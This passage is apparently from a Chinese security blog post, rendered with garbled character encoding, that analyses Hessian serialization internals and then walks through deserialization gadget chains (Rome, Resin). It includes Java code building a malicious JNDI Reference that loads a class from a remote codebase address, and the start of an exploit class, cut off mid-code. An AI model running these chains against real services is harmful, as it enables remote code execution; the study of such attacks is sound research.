src="https://cdn.clown2024.cn/202410091949119.png" alt="image-20241009194929048"></p><p>ä¸€å¼€å§‹è°ƒç”¨_inputFactoryè¯»å–headerï¼Œç„¶åæ ¹æ®headeræ¥åˆ›å»ºå¯¹åº”çš„Inputå’ŒOutputæµï¼Œæœ€åå†invokeè°ƒç”¨ä¸€æ¬¡æœåŠ¡</p><p>è¿™é‡Œä»£ç æ¯”è¾ƒé•¿å°±ç›´æ¥æˆªæ–‡ç« é‡Œçš„å›¾äº†ï¼Œè¿™ä¸ªå›¾å†™äº†æ³¨é‡Š</p><p><img src="https://cdn.clown2024.cn/202410092030361.png" alt="image-20241009203055295"></p><p>è¿˜æœ‰springçš„é€»è¾‘ä¹Ÿå·®ä¸å¤šçœ‹çœ‹æ–‡ç« çš„å°±å¥½äº†</p><h2 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç»†èŠ‚</h2><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¯»å–ã€å†™å…¥å°±æ˜¯ç”±æˆ‘ä»¬å‰é¢æåˆ°è¿‡çš„AbstractHessianInput&#x2F;AbstractHessianOutputè¿™ä¸¤ä¸ªæŠ½è±¡ç±»æä¾›ï¼Œç„¶åHessian&#x2F;Hessian2&#x2F;Burlapéƒ½æä¾›äº†æ–¹æ³•çš„å…·ä½“å®ç°</p><p>ä»¥Hessian2Outputä¸ºä¾‹å­çœ‹çœ‹åºåˆ—åŒ–çš„å†™å…¥</p><p><img src="https://cdn.clown2024.cn/202410092039705.png" alt="image-20241009203934647"></p><p>è¿™é‡Œæ ¹æ®å…·ä½“çš„ç±»æ¥è·å–åºåˆ—åŒ–å™¨ç„¶åå†™å…¥åºåˆ—åŒ–æ•°æ®ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹Serializerçš„å®ç°ç±»æœ‰å¤šå°‘</p><p><img src="https://cdn.clown2024.cn/202410092044894.png" alt="image-20241009204454835"></p><p>å¯¹äºè‡ªå®šä¹‰ç±»å‹ï¼Œå°†ä¼šä½¿ç”¨ <code>JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer</code> è¿›è¡Œç›¸å…³çš„åºåˆ—åŒ–åŠ¨ä½œï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ <code>UnsafeSerializer</code></p><p>çœ‹ä¸€ä¸‹UnsafeSerializer#writeObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410092233208.png" alt="image-20241009223331142"></p><p>è¿™é‡Œä¼šè°ƒç”¨ä¸€ä¸ªwriteObjectBeginæ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯AbstractHessianOutputçš„</p><p><img src="https://cdn.clown2024.cn/202410092236620.png" alt="image-20241009223618572"></p><p>é‡Œé¢å†è°ƒç”¨äº†ä¸€ä¸ªwriteMapBeginæ–¹æ³•ï¼ŒHessian2Output é‡å†™äº†writeObjectBeginè¿™ä¸ªæ–¹æ³•ï¼Œè€Œå…¶ä»–å®ç°ç±»æ²¡æœ‰ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨ Hessian 1.0 å’Œ Burlap ä¸­ï¼Œå†™å…¥è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆObjectï¼‰æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨ <code>writeMapBegin</code> æ–¹æ³•å°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p>åœ¨ Hessian 2.0 ä¸­ï¼Œå°†ä¼šè°ƒç”¨ <code>writeDefinition20</code> å’Œ <code>Hessian2Output#writeObjectBegin</code> æ–¹æ³•å†™å…¥è‡ªå®šä¹‰æ•°æ®ï¼Œå°±ä¸å†å°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p>å†çœ‹ååºåˆ—åŒ–ï¼Œä»¥Hessian2Inputä¸ºä¾‹</p><p><img src="https://cdn.clown2024.cn/202410092244449.png" alt="image-20241009224448389"></p><p>åŸºæœ¬å°±æ˜¯ä¸€å¤§ä¸²çš„switch caseè¯­å¥ï¼Œæ ¹æ®æ ‡è¯†ä½è¿›è¡Œä¸åŒçš„é€»è¾‘å¤„ç†</p><p><img src="https://cdn.clown2024.cn/202410092309278.png" alt="image-20241009230909226"></p><p>ä»–åœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿä¼šæ ¹æ®ç±»å‹è·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨</p><p><img src="https://cdn.clown2024.cn/202410092312974.png" alt="image-20241009231208927"></p><p>ç„¶åè¯»å–è‡ªå®šä¹‰ç±»å‹æ•°æ®ç”¨çš„æ˜¯UnsafeDeserializerç±»ï¼Œçœ‹ä¸€ä¸‹ä»–çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410092315911.png" alt="image-20241009231538854"></p><p><img src="https://cdn.clown2024.cn/202410092320613.png" alt="image-20241009232015561"></p><p>åˆ›å»ºUnsafeç±»å®ä¾‹ï¼Œç„¶åååºåˆ—åŒ–è¯»å–Fieldå¹¶åå°„å†™å…¥</p><p><img src="https://cdn.clown2024.cn/202410092320165.png" alt="image-20241009232019114"></p><p>Hessian 1.0 çš„ HessianInput ä¸­ï¼Œæ²¡æœ‰é’ˆå¯¹ Object çš„è¯»å–ï¼Œè€Œæ˜¯éƒ½å°†å…¶ä½œä¸º Map è¯»å–ï¼Œå› ä¸ºåœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¹Ÿæåˆ°ï¼Œåœ¨å†™å…¥è‡ªå®šä¹‰ç±»å‹æ—¶ä¼šå°†å…¶æ ‡è®°ä¸º Map ç±»å‹ã€‚</p><p><code>MapDeserializer#readMap</code> æ–¹æ³•æä¾›äº†é’ˆå¯¹ Map ç±»å‹æ•°æ®çš„å¤„ç†é€»è¾‘</p><p><img src="https://cdn.clown2024.cn/202410092327669.png" alt="image-20241009232731601"></p><h2 id="è¿œç¨‹è°ƒç”¨"><a href="#è¿œç¨‹è°ƒç”¨" class="headerlink" title="è¿œç¨‹è°ƒç”¨"></a>è¿œç¨‹è°ƒç”¨</h2><p>è¿˜æ˜¯æ ¹æ®å‰é¢çš„å®¢æˆ·ç«¯ä»£ç æ¥è°ƒè¯•ï¼Œæ ¹æ®createæ–¹æ³•ä¸€è·¯å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410092353919.png" alt="image-20241009235359859"></p><p>åœ¨è¿™é‡Œåˆ›å»ºäº†åŠ¨æ€ä»£ç†ï¼Œæˆ‘ä»¬çŸ¥é“åŠ¨æ€ä»£ç†è°ƒç”¨æ–¹æ³•æ—¶ä¼šèµ°InvocationHandler#invokeæ–¹æ³•ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410100001263.png" alt="image-20241010000103202"></p><p>è¿™é‡Œæ˜¯å¤„ç†ç›¸å…³æ–¹æ³•è°ƒç”¨ï¼Œå†å¾€åå°±æ˜¯å‘é€è¯·æ±‚ç»“æœå¹¶ååºåˆ—åŒ–ï¼Œæˆªä¸€ä¸‹æ–‡ç« çš„å›¾</p><p><img src="https://cdn.clown2024.cn/202410100008161.png" alt="image-20241010000832095"></p><h2 id="å…¶ä»–å®ç°ç»†èŠ‚"><a href="#å…¶ä»–å®ç°ç»†èŠ‚" class="headerlink" title="å…¶ä»–å®ç°ç»†èŠ‚"></a>å…¶ä»–å®ç°ç»†èŠ‚</h2><p><strong>åè®®ç‰ˆæœ¬</strong></p><p>ä½¿ç”¨é‚£ç§åè®®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–å–å†³äºè¯·æ±‚æ ‡å¿—ä½</p><p>è¿™ä¸€è®¾å®šä½äº <code>HessianProxyFactory</code> ä¸­çš„ä¸¤ä¸ªå¸ƒå°”å‹å˜é‡ä¸­ï¼Œå³ <code>_isHessian2Reply</code> å’Œ <code>_isHessian2Request</code></p><p><img src="https://cdn.clown2024.cn/202410100012841.png" alt="image-20241010001231800"></p><p>æƒ³æ›´æ”¹åè®®è‡ªå·±setæ–¹æ³•è®¾ç½®å³å¯</p><p><strong>Serializable</strong></p><p>æˆ‘ä»¬çŸ¥é“åœ¨Java åŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œå®ç°äº† <code>java.io.Serializable</code> æ¥å£çš„ç±»æ‰å¯ä»¥ååºåˆ—åŒ–</p><p>Hessianåœ¨è·å–é»˜è®¤åºåˆ—åŒ–å™¨çš„æ—¶å€™ä¼šæ£€æŸ¥æ˜¯å¦å®ç°äº†Serializableæ¥å£</p><p><img src="https://cdn.clown2024.cn/202410100020094.png" alt="image-20241010002017043"></p><p>ä½†æ˜¯æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ª_isAllowNonSerializableå˜é‡ï¼Œå®ƒå¯ä»¥æ‰“ç ´è¿™ç§è§„èŒƒï¼Œæˆ‘ä»¬åªè¦ç”¨setæ–¹æ³•å°†ä»–è®¾ç½®ä¸ºtrueï¼Œè¿™æ ·æ²¡æœ‰å®ç°Serializableæ¥å£çš„ç±»ä¹Ÿèƒ½åºåˆ—åŒ–</p><p>ç„¶åæ˜¯ transient å’Œ static çš„é—®é¢˜ï¼Œåœ¨åºåˆ—åŒ–æ—¶ï¼Œç”± <code>UnsafeSerializer#introspect</code> æ–¹æ³•æ¥è·å–å¯¹è±¡ä¸­çš„å­—æ®µï¼Œåœ¨è€ç‰ˆæœ¬ä¸­åº”è¯¥æ˜¯ <code>getFieldMap</code> æ–¹æ³•ã€‚ä¾æ—§æ˜¯åˆ¤æ–­äº†æˆå‘˜å˜é‡æ ‡è¯†ç¬¦ï¼Œå¦‚æœæ˜¯ transient å’Œ static å­—æ®µåˆ™ä¸ä¼šå‚ä¸åºåˆ—åŒ–ååºåˆ—åŒ–æµç¨‹ã€‚</p><p><img src="https://cdn.clown2024.cn/202410100024721.png" alt="image-20241010002444663"></p><p>è¿™ä¸ªåœ°æ–¹å¯¹æ ‡è¯†ç¬¦è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸º transient å’Œ static å­—æ®µåˆ™ä¸ä¼šå‚ä¸åºåˆ—åŒ–ååºåˆ—åŒ–æµç¨‹</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å‰é¢çš„åˆ†æå¯ä»¥çŸ¥é“Hessianå¤§éƒ¨åˆ†æ˜¯åˆ©ç”¨åå°„å†™å…¥å€¼ï¼Œä¸”è¿‡ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨ç±»çš„readObjectæ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰è§¦å‘getter&#x2F;setteræ–¹æ³•ï¼Œé‚£ä¹ˆæ¼æ´ç‚¹åœ¨å“ªå‘¢</p><p>æ¼æ´ç‚¹å°±åœ¨æˆ‘ä»¬å‰é¢è¯´è¿‡çš„å¯¹Mapç±»å‹æ•°æ®çš„å¤„ç†ä¸Šï¼Œ<code>MapDeserializer#readMap</code> å¯¹ Map ç±»å‹æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ˜¯ä¼šåˆ›å»ºç›¸åº”çš„ Map å¯¹è±¡ï¼Œå¹¶å°† Key å’Œ Value åˆ†åˆ«ååºåˆ—åŒ–åä½¿ç”¨ put æ–¹æ³•å†™å…¥æ•°æ®ã€‚åœ¨æ²¡æœ‰æŒ‡å®š Map çš„å…·ä½“å®ç°ç±»æ—¶ï¼Œå°†ä¼šé»˜è®¤ä½¿ç”¨ HashMap ï¼Œå¯¹äº SortedMapï¼Œå°†ä¼šä½¿ç”¨ TreeMapã€‚</p><p><img src="https://cdn.clown2024.cn/202410100032949.png" alt="image-20241010003247887"></p><p>é‚£åˆ©ç”¨çš„æ–¹å¼å…¶å®å°±æ¯”è¾ƒå¥½è”æƒ³äº†å¯¹äºè¿™ä¸¤ä¸ªç±»</p><p>HashMapåœ¨putçš„æ—¶å€™ä¼šè°ƒç”¨hashæ–¹æ³•ï¼Œä»è€Œè°ƒç”¨key.hashCodeã€‚</p><p><img src="https://cdn.clown2024.cn/202410100035334.png" alt="image-20241010003515291"></p><p>TreeMap åœ¨ put æ—¶ï¼Œç”±äºè¦è¿›è¡Œæ’åºï¼Œæ‰€ä»¥è¦å¯¹ key è¿›è¡Œæ¯”è¾ƒæ“ä½œï¼Œå°†ä¼šè°ƒç”¨ compare æ–¹æ³•ï¼Œä¼šè°ƒç”¨ key çš„ compareTo æ–¹æ³•ã€‚</p><p><img src="https://cdn.clown2024.cn/202410100035008.png" alt="image-20241010003554961"></p><p>è¿™ä¹ˆä¸€çœ‹Hessianååºåˆ—åŒ–åˆ©ç”¨è¢«é™åˆ¶å¾—æ¯”è¾ƒçª„</p><ul><li>kick-off chain èµ·å§‹æ–¹æ³•åªèƒ½ä¸º hashCode&#x2F;equals&#x2F;compareTo æ–¹æ³•ï¼›</li><li>åˆ©ç”¨é“¾ä¸­è°ƒç”¨çš„æˆå‘˜å˜é‡ä¸èƒ½ä¸º transient ä¿®é¥°ï¼›</li><li>æ‰€æœ‰çš„è°ƒç”¨ä¸ä¾èµ–ç±»ä¸­ readObject çš„é€»è¾‘ï¼Œä¹Ÿä¸ä¾èµ– getter&#x2F;setter çš„é€»è¾‘ã€‚</li></ul><h1 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h1><p>åœ¨<a href="https://github.com/mbechler/marshalsec">marshalsec</a>é¡¹ç›®é‡Œæœ‰å…³äºè¯¥ååºåˆ—åŒ–çš„å®ç°ï¼Œæœ‰ä¸‹é¢äº”æ¡é“¾</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h2 id="romeé“¾"><a href="#Romeé“¾" class="headerlink" title="Romeé“¾"></a>Romeé“¾</h2><p>Romeé“¾çš„æ ¸å¿ƒæ˜¯ä»–çš„ToStringBeançš„toStringæ–¹æ³•ï¼Œä»–å¯ä»¥è°ƒç”¨ä¼ å…¥ç±»çš„æ‰€æœ‰æ— å‚getteræ–¹æ³•ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰“JdbcRowSetImplçš„é“¾å­è§¦å‘jndi</p><p>ç„¶åToStringBeanå¤–é¢åŒ…ä¸€å±‚EqualsBeanå’ŒHashMapå³å¯</p><p>è§¦å‘é“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>JdbcRowSetImpl#getDatabaseMetaData<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410101102136.png" alt="image-20241010110223027"></p><p><img src="https://cdn.clown2024.cn/202410101102006.png" alt="image-20241010110235946"></p><h3 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h3><p>ä¸Šé¢çš„JNDIåˆ©ç”¨éœ€è¦å‡ºç½‘ï¼Œæ‰€ä»¥å¯ä»¥å€ŸåŠ©SignedObject#getObjectæ¥æ‰“äºŒæ¬¡ååºåˆ—åŒ–</p><p>é“¾å­æ”¹æˆè¿™æ ·å°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>SignedObject#getObject<br></code></pre></td></tr></table></figure><p>ç„¶åå°è£…ä¸€ä¸ªæƒ³è¦çš„é“¾å­è¿›å»å°±è¡Œäº†</p><h2 id="resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>è¯¥é“¾å­æœ€ç»ˆæ•ˆæœæ‰“çš„æ˜¯è¿œç¨‹ç±»åŠ è½½</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/136727060">https://blog.csdn.net/uuzeray/article/details/136727060</a></p><p>Resinæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ã€é«˜æ€§èƒ½çš„å¼€æºJavaåº”ç”¨æœåŠ¡å™¨ã€‚å®ƒæ˜¯ç”±Caucho Technologyå¼€å‘çš„ï¼Œæ—¨åœ¨æä¾›å¯é çš„Webåº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„è¿è¡Œç¯å¢ƒï¼Œå’ŒTomcatä¸€æ ·æ˜¯ä¸ªæœåŠ¡å™¨ï¼›ä»–å¸¸å’ŒHessianäº§ç”Ÿè”ç³»</p><p>æµ‹è¯•æ—¶å¯ä»¥å¯¼å…¥ä¸‹é¢çš„åŒ…</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.64<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Resin è¿™æ¡åˆ©ç”¨é“¾çš„å…¥å£ç‚¹å®é™…ä¸Šæ˜¯ HashMap å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡æ—¶è§¦å‘çš„ <code>com.sun.org.apache.xpath.internal.objects.XString</code> çš„ <code>equals</code> æ–¹æ³•ã€‚</p><p>XStringçš„åˆ©ç”¨åœ¨ROMEçš„HotSwappableTargetSourceåˆ©ç”¨é“¾æœ‰ç”¨åˆ°è¿‡</p><p><img src="https://cdn.clown2024.cn/202410102001525.png" alt="image-20241010200147467"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯com.caucho.naming.QNameçš„toStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102003734.png" alt="image-20241010200338680"></p><p>è¿™é‡Œçš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯QNameæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å¾—å…ˆäº†è§£ä¸€ä¸‹ï¼Œæ‰èƒ½çŸ¥é“ä»–è¿™æ ·ä¸ºä»€ä¹ˆå¯ä»¥è§¦å‘</p><p>çœ‹ä¸€ä¸‹ä»–çš„æè¿°</p><p><img src="https://cdn.clown2024.cn/202410102030167.png" alt="image-20241010203001097"></p><p>è¿™é‡Œæè¿°æ„æ€æ˜¯ä»£è¡¨ä¸€ä¸ªå·²è§£æçš„JNDIåç§°</p><p>çœ‹ä¸€ä¸‹ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102032765.png" alt="image-20241010203211713"></p><p>QNameå¯¹è±¡çš„åŠŸèƒ½æ˜¯ç”¨äºè¡¨ç¤ºä¸€ä¸ªJNDIé™å®šåï¼ˆqualified nameï¼‰ï¼Œé€šè¿‡ä¼ å…¥çš„Contextå¯¹è±¡ä»¥åŠä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼ˆfirstå’Œrestï¼‰ï¼ŒQNameå¯¹è±¡å¯ä»¥å°†è¿™äº›ä¿¡æ¯ç»„åˆèµ·æ¥å½¢æˆä¸€ä¸ªå®Œæ•´çš„é™å®šåã€‚</p><p>Contextæ¥å£çš„æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This interface represents a naming context, which consists of a set of name-to-object bindings. It contains methods for examining and updating these bindings.<br></code></pre></td></tr></table></figure><p>æ­¤æ¥å£è¡¨ç¤ºä¸€ä¸ªå‘½åä¸Šä¸‹æ–‡ï¼Œå®ƒç”±ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šç»„æˆã€‚å®ƒåŒ…å«æ£€æŸ¥å’Œæ›´æ–°è¿™äº›ç»‘å®šçš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯jndiçš„ç›¸å…³æ“ä½œ</p><p>ç„¶åæˆ‘ä»¬è¦ç”¨åˆ°çš„Contextçš„å®ç°ç±»æ˜¯ContinuationContext</p><p>æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102039546.png" alt="image-20241010203937489"></p><p>CannotProceedExceptionæ˜¯javax.namingå¼‚å¸¸ä½“ç³»ä¸­çš„ä¸€ç§å¼‚å¸¸ï¼Œé€šå¸¸åœ¨æœ¬åœ°åŠ è½½ç±»å¤±è´¥æ—¶ä½¿ç”¨ã€‚å®ƒçš„ä½œç”¨æ˜¯å¯¹æ— æ³•ç»§ç»­è¿›è¡Œæ“ä½œçš„å¼‚å¸¸æƒ…å†µè¿›è¡Œå¤„ç†ã€‚</p><p>å¤„ç†çš„å…³é”®åœ¨Referenceç±»ï¼Œæ–‡ç« ç»™äº†ä¸€ä¸ªå¯¹CannotProceedExceptionç±»çš„æ„é€ </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://124.222.136.33:1337/&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br> <br><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br> <br><span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br><span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br></code></pre></td></tr></table></figure><p>Referenceæ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102106681.png" alt="image-20241010210638627"></p><p>ç°åœ¨å›åˆ°å‰é¢QNameçš„toStringæ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨ContinuationContext#composeNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410102113650.png" alt="image-20241010211324591"></p><p>ç„¶åè°ƒç”¨åˆ°getTargetContextæ–¹æ³•ï¼Œè¿™é‡Œçš„ctx.composeNameæ–¹æ³•å¯ä»¥å¿½ç•¥ï¼Œä¸åœ¨åˆ©ç”¨é“¾ä¸­</p><p><img src="https://cdn.clown2024.cn/202410102114406.png" alt="image-20241010211417350"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°NamingManager.getContextæ–¹æ³•é‡Œé¢ï¼Œä¸è¿‡è¿˜éœ€è¦æ»¡è¶³å‰é¢çš„ä¸¤ä¸ªæ¡ä»¶</p><p>contCtx &#x3D;&#x3D; nullï¼Œåœ¨æ„é€ ä¸­æœ¬èº«å°±ä¸è®¾ç½®ï¼Œæ‰€ä»¥ä¸éœ€è¦è€ƒè™‘<br>cpe.getResolvedObj()è¿”å›ä¸ä¸ºnull(å…¶å®è¿”å›çš„å°±æ˜¯æˆ‘ä»¬ä¸Šé¢ç»™CannotProceedExceptionæ„é€ çš„æ¶æ„Reference)ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šä¸ºnull</p><p>è¿™é‡Œä¼ çš„æ˜¯cpe.getResolvedObjï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ çš„Referenceç±»</p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202410102122102.png" alt="image-20241010212200426"></p><p>ç„¶åæ¼æ´çš„è§¦å‘ç‚¹å°±åœ¨NamingManager#getObjectInstanceè¿™ä¸ªæ–¹æ³•é‡Œé¢ï¼Œä»åå­—çœ‹å°±æ˜¯è¦å¯¹æˆ‘ä»¬ä¼ å…¥çš„Referenceç±»è¿›è¡Œå®ä¾‹åŒ–</p><p>æœ‰å…³è¯¥æ–¹æ³•çš„æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Creates an instance of an object for the specified object and environment.<br>If an object factory builder has been installed, it is used to create a factory for creating the object. Otherwise, the following rules are used to create the object:<br>If refInfo is a Reference or Referenceable containing a factory class name, use the named factory to create the object. Return refInfo if the factory cannot be created<br>ç¿»è¯‘ä¸€ä¸‹ï¼š<br>ä¸ºæŒ‡å®šçš„å¯¹è±¡å’Œç¯å¢ƒåˆ›å»ºå¯¹è±¡çš„å®ä¾‹ã€‚<br>å¦‚æœå·²å®‰è£…å¯¹è±¡å·¥å‚ç”Ÿæˆå™¨ï¼Œåˆ™ä½¿ç”¨å®ƒæ¥åˆ›å»ºç”¨äºåˆ›å»ºå¯¹è±¡çš„å·¥å‚ã€‚å¦åˆ™ï¼Œå°†ä½¿ç”¨ä»¥ä¸‹è§„åˆ™åˆ›å»ºå¯¹è±¡ï¼š<br>å¦‚æœrefInfoæ˜¯åŒ…å«å·¥å‚ç±»åçš„Referenceæˆ–Referenceableï¼Œè¯·ä½¿ç”¨å‘½åçš„å·¥å‚åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœæ— æ³•åˆ›å»ºå·¥å‚ï¼Œåˆ™è¿”å›refInfoã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102142943.png" alt="image-20241010214214868"></p><p>ç„¶åå…³é”®ç±»æ–¹æ³•æ˜¯getObjectFactoryFromReference</p><p><img src="https://cdn.clown2024.cn/202410102157527.png" alt="image-20241010215719459"></p><p>è¿™é¦–å…ˆä¼šä»æœ¬åœ°åŠ è½½ç±»ï¼Œè‚¯å®šåŠ è½½ä¸åˆ°ï¼Œç„¶åå°±ä»codebaseåŠ è½½ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„è¿œç¨‹åœ°å€é‚£é‡Œï¼Œæœ€ååŠè¿›è¡Œç±»çš„å®ä¾‹åŒ–ï¼Œç„¶åè§¦å‘æ¼æ´</p><p>ç„¶åå°±æ˜¯hashMapè¦è§¦å‘equalsè¿˜è¦æ„é€ å“ˆå¸Œç›¸ç­‰ï¼Œæœ‰ç‚¹æ‡’å¾—å†åˆ†æäº†ï¼Œç›´æ¥copyæ–‡ç« çš„expå°æ”¹ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span 